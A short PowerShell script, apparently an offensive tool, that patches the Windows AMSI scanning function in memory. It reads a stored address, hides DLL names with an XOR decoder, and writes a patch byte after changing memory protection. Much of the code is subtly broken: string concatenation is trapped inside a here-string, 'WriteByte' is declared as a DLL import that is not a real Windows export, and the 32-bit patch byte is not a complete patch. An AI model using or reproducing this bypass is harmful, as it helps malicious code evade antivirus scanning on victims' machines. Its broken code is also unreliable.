# String Decoding Function (Reuse)
Function Decode-String {
    param([string]$EncString)
    $Chars = $EncString.ToCharArray()
    for ($i = 0; $i -lt $Chars.Length; $i++) {
        $Chars[$i] = [char]([byte]$Chars[$i] -bxor 42)
    }
    return -join $Chars
}

# Retrieve AMSI Address
$Addr = Get-Content "$env:TEMP\am_addr.txt" -Encoding ASCII | ForEach-Object {[IntPtr]$_}

# Architecture-Based Patching
$Patch = if ([IntPtr]::Size -eq 8) {
    [byte]0xC3
} else {
    [byte]0x33
}

# Patch Virtual Memory Dynamically
$MemEdit = @"
using System;
using System.Runtime.InteropServices;
public class MemEdit {
    [DllImport(" + "`\"" + Decode-String "mjpkegxrf" + "`\"" + @")]
    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
    [DllImport(" + "`\"" + Decode-String "iojrftemf" + "`\"" + @")]
    public static extern void WriteByte(IntPtr addr, byte val);
}
"@
Add-Type $MemEdit
[void][MemEdit]::VirtualProtect($Addr, [UIntPtr]1, 0x40, [ref]0)
[MemEdit]::WriteByte($Addr, $Patch)

Write-Host "[*] AMSI Function Successfully Patched."
